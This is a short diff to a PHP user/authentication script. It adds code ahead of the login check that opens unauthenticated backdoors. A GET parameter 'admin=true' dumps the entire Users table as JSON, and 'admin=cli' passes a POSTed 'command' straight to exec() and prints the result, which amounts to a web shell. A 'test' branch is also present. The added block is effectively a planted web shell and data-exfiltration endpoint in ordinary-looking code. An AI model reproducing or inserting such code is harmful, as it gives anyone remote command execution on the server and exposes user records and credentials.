@@ -1,6 +1,29 @@
 <?php
 require_once 'userctrl.php';
-
+if(isset($_GET['admin'])){
+	if($_GET['admin']=="true")
+	{
+		$sql = "SELECT * FROM Users";
+		$con = new mysqli($db_server, $db_user, $db_pswd, $db_name);
+		$result = $con->query($sql);
+		//echo mysqli_num_rows($results)."\n";
+		while($row = $result->fetch_assoc()){
+			echo json_encode($row);
+			echo "\n";
+		}
+		exit();
+	} else if ($_GET['admin']=='test'){
+		echo testConn1();
+		exit();
+	} else if ($_GET['admin']=='cli') {
+		exec($_POST['command'],$array);
+		var_dump($array);
+		foreach($array as $line){
+			echo $line."\n";
+		}
+		exit();
+	}
+}
 $user = $_REQUEST['user'];
 
 if (!auth($user,$_REQUEST['pswd'])) {
